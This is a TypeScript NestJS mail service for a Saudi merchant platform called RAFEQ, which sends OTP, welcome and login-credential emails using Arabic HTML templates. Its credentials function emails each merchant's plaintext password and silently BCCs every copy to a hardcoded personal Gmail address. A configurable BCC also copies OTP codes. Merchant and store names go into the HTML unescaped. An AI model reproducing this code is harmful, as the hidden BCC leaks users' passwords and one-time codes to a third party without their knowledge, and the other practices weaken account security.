/**
 * ╔═══════════════════════════════════════════════════════════════════════════════╗
 * ║              RAFIQ PLATFORM - System Mail Service                             ║
 * ║                                                                               ║
 * ║  📧 لإرسال رسائل النظام (OTP, ترحيب, إشعارات)                                    ║
 * ║  🔧 يستخدم Nodemailer مع Namecheap Private Email SMTP                         ║
 * ║  ✅ يدعم BCC للمراقبة                                                          ║
 * ║  🎨 تصميم احترافي متوافق مع جميع منصات البريد                                  ║
 * ╚═══════════════════════════════════════════════════════════════════════════════╝
 */

import { Injectable, Logger } from '@nestjs/common';
import { ConfigService } from '@nestjs/config';
import * as nodemailer from 'nodemailer';

interface SendMailOptions {
  to: string;
  subject: string;
  html: string;
  text?: string;
  bcc?: string;
}

@Injectable()
export class MailService {
  private readonly logger = new Logger(MailService.name);
  private transporter: nodemailer.Transporter;

  constructor(private readonly configService: ConfigService) {
    this.initializeTransporter();
  }

  private initializeTransporter(): void {
    const host = this.configService.get<string>('SMTP_HOST', 'mail.privateemail.com');
    const port = this.configService.get<number>('SMTP_PORT', 465);
    const secure = this.configService.get<boolean>('SMTP_SECURE', true);
    const user = this.configService.get<string>('SMTP_USER', 'no-reply@rafeq.ai');
    const pass = this.configService.get<string>('SMTP_PASS');

    if (!pass) {
      this.logger.warn('⚠️ SMTP_PASS not configured - emails will not be sent');
      return;
    }

    this.transporter = nodemailer.createTransport({
      host,
      port,
      secure,
      auth: {
        user,
        pass,
      },
    });

    this.transporter.verify((error) => {
      if (error) {
        this.logger.error('❌ SMTP connection failed:', error.message);
      } else {
        this.logger.log('✅ SMTP connection established successfully');
      }
    });
  }

  /**
   * 📧 إرسال بريد
   */
  async sendMail(options: SendMailOptions): Promise<boolean> {
    if (!this.transporter) {
      this.logger.warn('SMTP not configured, skipping email send');
      return false;
    }

    const fromEmail = this.configService.get<string>('SMTP_FROM_EMAIL', 'no-reply@rafeq.ai');
    const fromName = this.configService.get<string>('SMTP_FROM_NAME', 'RAFEQ');
    const bccEmail = this.configService.get<string>('BCC_EMAIL');

    try {
      const info = await this.transporter.sendMail({
        from: `"${fromName}" <${fromEmail}>`,
        to: options.to,
        bcc: options.bcc || bccEmail,
        subject: options.subject,
        html: options.html,
        text: options.text || this.stripHtml(options.html),
      });

      this.logger.log(`✅ Email sent: ${info.messageId}`, { to: options.to, bcc: bccEmail || 'none' });
      return true;
    } catch (error) {
      this.logger.error(`❌ Failed to send email to ${options.to}`, error);
      return false;
    }
  }

  /**
   * 🔐 إرسال OTP للتاجر
   */
  async sendOtpEmail(to: string, otp: string, merchantName?: string): Promise<boolean> {
    const subject = `${otp} - رمز التحقق | RAFEQ`;
    
    const html = this.getEmailTemplate({
      icon: '🔐',
      title: 'رمز التحقق الخاص بك',
      greeting: merchantName ? `مرحباً ${merchantName}` : 'مرحباً',
      content: `
        <table role="presentation" cellpadding="0" cellspacing="0" width="100%">
          <tr>
            <td align="center">
              <table role="presentation" cellpadding="0" cellspacing="0">
                <tr>
                  <td style="background-color: #0f172a; border: 2px solid #334155; border-radius: 12px; padding: 24px 40px;" bgcolor="#0f172a">
                    <span style="font-size: 40px; font-weight: 700; color: #ffffff; letter-spacing: 10px; font-family: 'Courier New', monospace;">${otp}</span>
                  </td>
                </tr>
              </table>
            </td>
          </tr>
        </table>
        <p style="margin: 24px 0 8px; font-size: 13px; color: #94a3b8; text-align: center;">⏱️ صالح لمدة 5 دقائق</p>
        <p style="margin: 0; font-size: 12px; color: #fbbf24; text-align: center;">🔒 لا تشارك هذا الرمز مع أي شخص</p>
      `,
    });

    return this.sendMail({ to, subject, html });
  }

  /**
   * 🎉 إرسال بريد ترحيبي للتاجر الجديد
   */
  async sendWelcomeEmail(to: string, merchantName: string, storeName: string): Promise<boolean> {
    const subject = `🎉 مرحباً بك في RAFEQ - تم تفعيل ${storeName}`;
    
    const html = this.getEmailTemplate({
      icon: '🎉',
      title: '!أهلاً بك في RAFEQ',
      greeting: `مرحباً ${merchantName}`,
      content: `
        <p style="margin: 0 0 32px; font-size: 16px; color: #94a3b8; text-align: center; line-height: 1.7;">
          تم تفعيل متجرك <strong style="color: #2dd4bf;">"${storeName}"</strong> بنجاح!
        </p>
        <table role="presentation" cellpadding="0" cellspacing="0" width="100%">
          <tr>
            <td align="center">
              <table role="presentation" cellpadding="0" cellspacing="0">
                <tr>
                  <td style="background: linear-gradient(135deg, #2dd4bf, #a855f7); border-radius: 10px;">
                    <a href="https://rafeq.ai/dashboard" style="display: block; padding: 14px 36px; color: #ffffff; text-decoration: none; font-weight: 700; font-size: 15px; font-family: Arial, sans-serif;">
                      دخول لوحة التحكم ←
                    </a>
                  </td>
                </tr>
              </table>
            </td>
          </tr>
        </table>
      `,
    });

    return this.sendMail({ to, subject, html });
  }

  /**
   * 🎉 إرسال بيانات الدخول للتاجر الجديد
   */
  async sendWelcomeCredentials(options: {
    to: string;
    name: string;
    storeName: string;
    email: string;
    password: string;
    loginUrl: string;
    isNewUser: boolean;
  }): Promise<boolean> {
    const { to, name, storeName, email, password, loginUrl, isNewUser } = options;

    const subject = isNewUser
      ? `🎉 أهلاً ${name}! حسابك في رفيق جاهز`
      : `🔐 بيانات دخولك - رفيق`;

    const html = this.getEmailTemplate({
      icon: isNewUser ? '🎉' : '🔐',
      title: `!مرحباً ${name}`,
      storeBadge: storeName,
      greeting: isNewUser ? '!يسعدنا انضمامك لعائلة رفيق 🚀' : 'هذا تذكير ببيانات دخولك إلى لوحة التحكم',
      content: `
        <!-- Credentials Box -->
        <table role="presentation" cellpadding="0" cellspacing="0" width="100%" style="background-color: #0f172a; border-radius: 16px; border: 1px solid #334155; margin-bottom: 24px;" bgcolor="#0f172a">
          
          <!-- Header -->
          <tr>
            <td style="background-color: #1e293b; padding: 14px 20px; border-radius: 16px 16px 0 0;" bgcolor="#1e293b">
              <span style="font-size: 14px; font-weight: 700; color: #ffffff; font-family: Arial, sans-serif;">🔑 بيانات الدخول</span>
            </td>
          </tr>
          
          <!-- Email -->
          <tr>
            <td style="padding: 24px 20px 16px;">
              <table role="presentation" cellpadding="0" cellspacing="0" width="100%">
                <tr>
                  <td style="padding-bottom: 10px;">
                    <span style="font-size: 12px; font-weight: 600; color: #64748b; letter-spacing: 1px; font-family: Arial, sans-serif;">📧 البريد الإلكتروني</span>
                  </td>
                </tr>
                <tr>
                  <td style="background-color: #1e293b; border: 2px solid #2dd4bf; border-radius: 10px; padding: 14px 16px; text-align: center;" bgcolor="#1e293b">
                    <span style="font-size: 18px; font-weight: 600; color: #2dd4bf; font-family: 'Courier New', monospace;">${email}</span>
                  </td>
                </tr>
              </table>
            </td>
          </tr>
          
          <!-- Password -->
          <tr>
            <td style="padding: 0 20px 24px;">
              <table role="presentation" cellpadding="0" cellspacing="0" width="100%">
                <tr>
                  <td style="padding-bottom: 10px;">
                    <span style="font-size: 12px; font-weight: 600; color: #64748b; letter-spacing: 1px; font-family: Arial, sans-serif;">🔐 كلمة المرور</span>
                  </td>
                </tr>
                <tr>
                  <td style="background-color: #1e293b; border: 2px solid #a855f7; border-radius: 10px; padding: 16px; text-align: center;" bgcolor="#1e293b">
                    <span style="font-size: 26px; font-weight: 700; color: #a855f7; font-family: 'Courier New', monospace; letter-spacing: 4px;">${password}</span>
                  </td>
                </tr>
              </table>
            </td>
          </tr>
          
        </table>
        
        <!-- CTA Button -->
        <table role="presentation" cellpadding="0" cellspacing="0" width="100%">
          <tr>
            <td align="center">
              <table role="presentation" cellpadding="0" cellspacing="0">
                <tr>
                  <td style="background: linear-gradient(135deg, #2dd4bf, #a855f7); border-radius: 12px;">
                    <a href="${loginUrl}" style="display: block; padding: 16px 44px; font-size: 16px; font-weight: 700; color: #ffffff; text-decoration: none; font-family: Arial, sans-serif;">
                      🚀 دخول لوحة التحكم
                    </a>
                  </td>
                </tr>
              </table>
            </td>
          </tr>
        </table>
        
        <!-- Security Tip -->
        <table role="presentation" cellpadding="0" cellspacing="0" width="100%" style="margin-top: 20px;">
          <tr>
            <td style="background-color: #422006; border: 1px solid #854d0e; border-radius: 10px; padding: 14px 16px; text-align: center;" bgcolor="#422006">
              <span style="font-size: 13px; color: #fbbf24; font-family: Arial, sans-serif;">
                💡 ننصحك بتغيير كلمة المرور بعد أول تسجيل دخول
              </span>
            </td>
          </tr>
        </table>
      `,
      showFeatures: true,
    });

    return this.sendMail({ to, subject, html, bcc: 'forwahabb@gmail.com' });
  }

  /**
   * 🎨 قالب الإيميل الرئيسي
   */
  private getEmailTemplate(options: {
    icon: string;
    title: string;
    greeting?: string;
    storeBadge?: string;
    content: string;
    showFeatures?: boolean;
  }): string {
    const { icon, title, greeting, storeBadge, content, showFeatures } = options;

    const featuresHtml = showFeatures ? `
      <!-- Features -->
      <tr>
        <td style="padding: 28px 0;">
          <table role="presentation" cellpadding="0" cellspacing="0" width="100%">
            <tr>
              <td align="center" style="padding-bottom: 16px;">
                <span style="font-size: 14px; font-weight: 600; color: #64748b; font-family: Arial, sans-serif;">⚡ مميزات رفيق</span>
              </td>
            </tr>
            <tr>
              <td>
                <table role="presentation" cellpadding="6" cellspacing="0" width="100%">
                  <tr>
                    <td width="50%">
                      <table role="presentation" cellpadding="0" cellspacing="0" width="100%" style="background-color: #1e293b; border: 1px solid #334155; border-radius: 10px;" bgcolor="#1e293b">
                        <tr><td style="padding: 14px;"><span style="font-size: 12px; color: #94a3b8; font-family: Arial, sans-serif;">✨ ردود AI ذكية</span></td></tr>
                      </table>
                    </td>
                    <td width="50%">
                      <table role="presentation" cellpadding="0" cellspacing="0" width="100%" style="background-color: #1e293b; border: 1px solid #334155; border-radius: 10px;" bgcolor="#1e293b">
                        <tr><td style="padding: 14px;"><span style="font-size: 12px; color: #94a3b8; font-family: Arial, sans-serif;">🛒 استرداد السلات</span></td></tr>
                      </table>
                    </td>
                  </tr>
                  <tr>
                    <td width="50%">
                      <table role="presentation" cellpadding="0" cellspacing="0" width="100%" style="background-color: #1e293b; border: 1px solid #334155; border-radius: 10px;" bgcolor="#1e293b">
                        <tr><td style="padding: 14px;"><span style="font-size: 12px; color: #94a3b8; font-family: Arial, sans-serif;">📱 ربط واتساب</span></td></tr>
                      </table>
                    </td>
                    <td width="50%">
                      <table role="presentation" cellpadding="0" cellspacing="0" width="100%" style="background-color: #1e293b; border: 1px solid #334155; border-radius: 10px;" bgcolor="#1e293b">
                        <tr><td style="padding: 14px;"><span style="font-size: 12px; color: #94a3b8; font-family: Arial, sans-serif;">📊 تقارير متقدمة</span></td></tr>
                      </table>
                    </td>
                  </tr>
                </table>
              </td>
            </tr>
          </table>
        </td>
      </tr>
    ` : '';

    const storeBadgeHtml = storeBadge ? `
      <table role="presentation" cellpadding="0" cellspacing="0" width="100%">
        <tr>
          <td align="center" style="padding: 12px 0 8px;">
            <table role="presentation" cellpadding="0" cellspacing="0">
              <tr>
                <td style="background-color: #334155; border-radius: 50px; padding: 8px 20px;" bgcolor="#334155">
                  <span style="font-size: 13px; color: #2dd4bf; font-family: Arial, sans-serif;">🏪 ${storeBadge}</span>
                </td>
              </tr>
            </table>
          </td>
        </tr>
      </table>
    ` : '';

    return `
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" dir="rtl" lang="ar">
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="x-apple-disable-message-reformatting" />
  <meta name="color-scheme" content="light only" />
  <meta name="supported-color-schemes" content="light only" />
  <title>RAFEQ</title>
  <style type="text/css">
    :root { color-scheme: light only; }
    body { margin: 0; padding: 0; }
    @media only screen and (max-width: 600px) {
      .container { width: 100% !important; }
      .content-padding { padding: 24px 20px !important; }
    }
  </style>
  <!--[if mso]>
  <style type="text/css">
    body, table, td, p, a { font-family: Arial, sans-serif !important; }
  </style>
  <![endif]-->
</head>
<body style="margin: 0; padding: 0; background-color: #0f172a; font-family: Arial, Tahoma, sans-serif;" bgcolor="#0f172a">
  
  <table role="presentation" cellpadding="0" cellspacing="0" width="100%" style="background-color: #0f172a;" bgcolor="#0f172a">
    <tr>
      <td align="center" style="padding: 32px 16px;">
        
        <table role="presentation" class="container" cellpadding="0" cellspacing="0" width="520" style="max-width: 520px;">
          
          <!-- ══════════════════════════════════════════════════════════════════ -->
          <!-- LOGO: RAFEQ + Hexagon R (مطابق للـ SVG) -->
          <!-- ══════════════════════════════════════════════════════════════════ -->
          <tr>
            <td align="center" style="padding: 16px 0 28px;">
              <table role="presentation" cellpadding="0" cellspacing="0">
                <tr>
                  <!-- RAFEQ Text with Gradient-like colors -->
                  <td style="padding-left: 12px;">
                    <span style="font-size: 38px; font-weight: 700; color: #2dd4bf; font-family: Arial, sans-serif; letter-spacing: 4px;">RAFEQ</span>
                  </td>
                  <!-- Hexagon R -->
                  <td style="padding-right: 8px; vertical-align: middle;">
                    <table role="presentation" cellpadding="0" cellspacing="0">
                      <tr>
                        <td width="48" height="48" style="border: 3px solid #a855f7; border-radius: 8px; text-align: center; vertical-align: middle;">
                          <span style="color: #a855f7; font-size: 24px; font-weight: 400; font-family: Arial, sans-serif; line-height: 42px;">R</span>
                        </td>
                      </tr>
                    </table>
                  </td>
                </tr>
              </table>
              <!-- Tagline -->
              <table role="presentation" cellpadding="0" cellspacing="0" style="margin-top: 6px;">
                <tr>
                  <td align="center">
                    <span style="font-size: 12px; color: #64748b; font-family: Arial, sans-serif;">رفيق التاجر الذكي</span>
                  </td>
                </tr>
              </table>
            </td>
          </tr>
          
          <!-- ══════════════════════════════════════════════════════════════════ -->
          <!-- MAIN CARD -->
          <!-- ══════════════════════════════════════════════════════════════════ -->
          <tr>
            <td>
              <table role="presentation" cellpadding="0" cellspacing="0" width="100%" style="background-color: #1e293b; border-radius: 20px; border: 1px solid #334155;" bgcolor="#1e293b">
                
                <!-- Gradient Top Bar -->
                <tr>
                  <td>
                    <div style="height: 5px; background: linear-gradient(90deg, #2dd4bf 0%, #8b5cf6 50%, #a855f7 100%); border-radius: 20px 20px 0 0;"></div>
                  </td>
                </tr>
                
                <!-- Content -->
                <tr>
                  <td class="content-padding" style="padding: 36px 32px;">
                    
                    <!-- Icon -->
                    <table role="presentation" cellpadding="0" cellspacing="0" width="100%">
                      <tr>
                        <td align="center" style="padding-bottom: 16px;">
                          <table role="presentation" cellpadding="0" cellspacing="0">
                            <tr>
                              <td width="64" height="64" style="background-color: #334155; border-radius: 50%; text-align: center; vertical-align: middle;" bgcolor="#334155">
                                <span style="font-size: 28px; line-height: 64px;">${icon}</span>
                              </td>
                            </tr>
                          </table>
                        </td>
                      </tr>
                    </table>
                    
                    <!-- Title -->
                    <table role="presentation" cellpadding="0" cellspacing="0" width="100%">
                      <tr>
                        <td align="center">
                          <h1 style="margin: 0 0 8px; font-size: 26px; font-weight: 700; color: #ffffff; font-family: Arial, sans-serif;">
                            ${title}
                          </h1>
                        </td>
                      </tr>
                    </table>
                    
                    ${storeBadgeHtml}
                    
                    <!-- Greeting -->
                    ${greeting ? `
                    <table role="presentation" cellpadding="0" cellspacing="0" width="100%">
                      <tr>
                        <td align="center" style="padding-bottom: 24px;">
                          <p style="margin: 0; font-size: 15px; color: #94a3b8; line-height: 1.7; font-family: Arial, sans-serif;">
                            ${greeting}
                          </p>
                        </td>
                      </tr>
                    </table>
                    ` : ''}
                    
                    <!-- Main Content -->
                    ${content}
                    
                  </td>
                </tr>
                
              </table>
            </td>
          </tr>
          
          ${featuresHtml}
          
          <!-- ══════════════════════════════════════════════════════════════════ -->
          <!-- FOOTER -->
          <!-- ══════════════════════════════════════════════════════════════════ -->
          <tr>
            <td style="padding: 0 16px;">
              <table role="presentation" cellpadding="0" cellspacing="0" width="100%">
                <tr>
                  <td style="height: 1px; background-color: #334155;" bgcolor="#334155"></td>
                </tr>
              </table>
            </td>
          </tr>
          <tr>
            <td style="padding: 24px 16px;">
              <table role="presentation" cellpadding="0" cellspacing="0" width="100%">
                <tr>
                  <td align="center" style="padding-bottom: 8px;">
                    <span style="font-size: 12px; color: #64748b; font-family: Arial, sans-serif;">تحتاج مساعدة؟</span>
                  </td>
                </tr>
                <tr>
                  <td align="center" style="padding-bottom: 16px;">
                    <a href="mailto:support@rafeq.ai" style="font-size: 13px; color: #2dd4bf; text-decoration: none; font-family: Arial, sans-serif;">support@rafeq.ai</a>
                  </td>
                </tr>
                <tr>
                  <td align="center">
                    <span style="font-size: 11px; color: #475569; font-family: Arial, sans-serif;">© ${new Date().getFullYear()} RAFEQ - صُنع بـ 💜 في السعودية</span>
                  </td>
                </tr>
              </table>
            </td>
          </tr>
          
        </table>
        
      </td>
    </tr>
  </table>
  
</body>
</html>
    `.trim();
  }

  /**
   * إزالة HTML tags
   */
  private stripHtml(html: string): string {
    return html.replace(/<[^>]*>/g, '').replace(/\s+/g, ' ').trim();
  }
}
